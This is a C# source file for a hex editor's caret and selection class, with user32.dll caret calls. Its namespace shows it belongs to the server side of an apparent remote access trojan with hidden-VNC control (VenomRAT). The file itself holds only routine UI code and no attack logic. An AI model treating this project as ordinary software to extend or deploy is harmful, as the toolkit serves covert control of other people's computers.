using System;
using System.Drawing;
using System.Runtime.InteropServices;

namespace VenomRAT_HVNC.Server.Helper.HexEditor
{
    public class Caret
    {
        public int SelectionStart
        {
            get
            {
                if (this._endIndex < this._startIndex)
                {
                    return this._endIndex;
                }
                return this._startIndex;
            }
        }

        public int SelectionLength
        {
            get
            {
                if (this._endIndex < this._startIndex)
                {
                    return this._startIndex - this._endIndex;
                }
                return this._endIndex - this._startIndex;
            }
        }

        public bool Focused
        {
            get
            {
                return this._isCaretActive;
            }
        }

        public int CurrentIndex
        {
            get
            {
                return this._endIndex;
            }
        }

        public Point Location
        {
            get
            {
                return this._location;
            }
        }

        public event EventHandler SelectionStartChanged;

        public event EventHandler SelectionLengthChanged;

        public Caret(HexEditor editor)
        {
            this._editor = editor;
            this._isCaretActive = false;
            this._startIndex = 0;
            this._endIndex = 0;
            this._isCaretHidden = true;
            this._location = new Point(0, 0);
        }

        private bool Create(IntPtr hWHandler)
        {
            if (!this._isCaretActive)
            {
                this._isCaretActive = true;
                return Caret.CreateCaret(hWHandler, IntPtr.Zero, 0, (int)this._editor.CharSize.Height - 2);
            }
            return false;
        }

        private bool Show(IntPtr hWnd)
        {
            if (this._isCaretActive)
            {
                this._isCaretHidden = false;
                return Caret.ShowCaret(hWnd);
            }
            return false;
        }

        public bool Hide(IntPtr hWnd)
        {
            if (this._isCaretActive && !this._isCaretHidden)
            {
                this._isCaretHidden = true;
                return Caret.HideCaret(hWnd);
            }
            return false;
        }

        public bool Destroy()
        {
            if (this._isCaretActive)
            {
                this._isCaretActive = false;
                this.DeSelect();
                Caret.DestroyCaret();
            }
            return false;
        }

        public void SetStartIndex(int index)
        {
            this._startIndex = index;
            this._endIndex = this._startIndex;
            if (this.SelectionStartChanged != null)
            {
                this.SelectionStartChanged(this, EventArgs.Empty);
            }
            if (this.SelectionLengthChanged != null)
            {
                this.SelectionLengthChanged(this, EventArgs.Empty);
            }
        }

        public void SetEndIndex(int index)
        {
            this._endIndex = index;
            if (this.SelectionStartChanged != null)
            {
                this.SelectionStartChanged(this, EventArgs.Empty);
            }
            if (this.SelectionLengthChanged != null)
            {
                this.SelectionLengthChanged(this, EventArgs.Empty);
            }
        }

        public void SetCaretLocation(Point start)
        {
            this.Create(this._editor.Handle);
            this._location = start;
            Caret.SetCaretPos(this._location.X, this._location.Y);
            this.Show(this._editor.Handle);
        }

        public bool IsSelected(int byteIndex)
        {
            return this.SelectionStart <= byteIndex && byteIndex < this.SelectionStart + this.SelectionLength;
        }

        private void DeSelect()
        {
            if (this._endIndex < this._startIndex)
            {
                this._startIndex = this._endIndex;
            }
            else
            {
                this._endIndex = this._startIndex;
            }
            if (this.SelectionStartChanged != null)
            {
                this.SelectionStartChanged(this, EventArgs.Empty);
            }
            if (this.SelectionLengthChanged != null)
            {
                this.SelectionLengthChanged(this, EventArgs.Empty);
            }
        }

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CreateCaret(IntPtr hWnd, IntPtr hBitmap, int nWidth, int nHeight);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool DestroyCaret();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetCaretPos(int x, int y);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool ShowCaret(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool HideCaret(IntPtr hWnd);

        private int _startIndex;

        private int _endIndex;

        private bool _isCaretActive;

        private bool _isCaretHidden;

        private Point _location;

        private HexEditor _editor;
    }
}
